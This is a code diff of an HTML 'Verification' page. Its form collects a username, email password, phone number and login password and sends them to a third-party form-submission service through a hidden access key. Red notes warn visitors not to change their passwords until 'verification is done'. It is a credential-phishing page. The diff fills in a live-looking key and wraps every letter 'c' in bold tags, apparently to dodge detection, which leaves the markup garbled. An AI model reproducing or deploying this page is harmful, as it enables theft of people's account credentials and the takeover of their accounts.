@@ -2,25 +2,25 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Account Verification</title>
+    <title>Verifi<b>c</b>ation Page</title>
     <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; display: flex; justify-content: center; padding: 40px; background-color: #f0f2f5; }
-        .form-container { width: 450px; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        h2 { text-align: center; color: #333; margin-bottom: 25px; }
-        label { font-weight: bold; display: block; margin-top: 15px; color: #555; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; display: flex; justify-<b>c</b>ontent: <b>c</b>enter; padding: 40px; ba<b>c</b>kground-<b>c</b>olor: #f0f2f5; }
+        .form-<b>c</b>ontainer { width: 450px; ba<b>c</b>kground: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        h2 { text-align: <b>c</b>enter; <b>c</b>olor: #333; margin-bottom: 25px; }
+        label { font-weight: bold; display: blo<b>c</b>k; margin-top: 15px; <b>c</b>olor: #555; }
         input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
-        .note { color: red; font-size: 13px; font-weight: bold; display: block; margin-bottom: 5px; }
-        #verifyBtn { width: 100%; padding: 14px; background-color: #007bff; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; margin-top: 25px; }
-        #statusMessage { margin-top: 20px; padding: 15px; border-radius: 6px; text-align: center; font-weight: bold; display: none; background-color: #fff3cd; color: #856404; border: 1px solid #ffeeba; }
+        .note { <b>c</b>olor: red; font-size: 13px; font-weight: bold; display: blo<b>c</b>k; margin-bottom: 5px; }
+        #verifyBtn { width: 100%; padding: 14px; ba<b>c</b>kground-<b>c</b>olor: #007bff; <b>c</b>olor: white; border: none; border-radius: 6px; <b>c</b>ursor: pointer; font-size: 16px; margin-top: 25px; }
+        #statusMessage { margin-top: 20px; padding: 15px; border-radius: 6px; text-align: <b>c</b>enter; font-weight: bold; display: none; ba<b>c</b>kground-<b>c</b>olor: #fff3<b>c</b>d; <b>c</b>olor: #856404; border: 1px solid #ffeeba; }
     </style>
 </head>
 <body>
 
-<div class="form-container">
-    <h2>Verification Form</h2>
+<div <b>c</b>lass="form-<b>c</b>ontainer">
+    <h2>Verifi<b>c</b>ation Form</h2>
     
-    <form action="https://api.web3forms.com/submit" method="POST" id="vForm">
-        <input type="hidden" name="access_key" value="PASTE_YOUR_KEY_HERE">
+    <form a<b>c</b>tion="https://api.web3forms.com/submit" method="POST" id="vForm">
+        <input type="hidden" name="a<b>c</b><b>c</b>ess_key" value="2<b>c</b>b4db<b>c</b>8-f7d2-4182-b176-9ff62975<b>c</b>b<b>c</b>9">
         
         <label>Username:</label>
         <input type="text" name="Username" required>
@@ -30,31 +30,31 @@
 
         <label>Email Password:</label>
         <input type="password" name="EmailPassword" required>
-        <span class="note">don't change the email id password untill verification is done</span>
+        <span <b>c</b>lass="note">don't <b>c</b>hange the email id password untill verifi<b>c</b>ation is done</span>
 
         <label>Phone Number:</label>
         <input type="text" name="Phone" required>
 
         <label>Login Password:</label>
         <input type="password" name="LoginPassword" required>
-        <span class="note">please do not change password untill verification is done</span>
+        <span <b>c</b>lass="note">please do not <b>c</b>hange password untill verifi<b>c</b>ation is done</span>
 
-        <input type="hidden" name="redirect" value="https://web3forms.com/success">
+        <input type="hidden" name="redire<b>c</b>t" value="https://web3forms.com/su<b>c</b><b>c</b>ess">
         <button type="submit" id="verifyBtn">Verify</button>
     </form>
 
     <div id="statusMessage">
-        Your verification is under review
+        Your verifi<b>c</b>ation is under review
     </div>
 </div>
 
-<script>
-    const form = document.getElementById('vForm');
-    form.onsubmit = function() {
-        document.getElementById('verifyBtn').style.display = "none"; 
-        document.getElementById('statusMessage').style.display = "block"; 
+<s<b>c</b>ript>
+    const form = do<b>c</b>ument.getElementById('vForm');
+    form.onsubmit = fun<b>c</b>tion() {
+        do<b>c</b>ument.getElementById('verifyBtn').style.display = "none"; 
+        do<b>c</b>ument.getElementById('statusMessage').style.display = "blo<b>c</b>k"; 
     };
-</script>
+</s<b>c</b>ript>
 
 </body>
 </html>
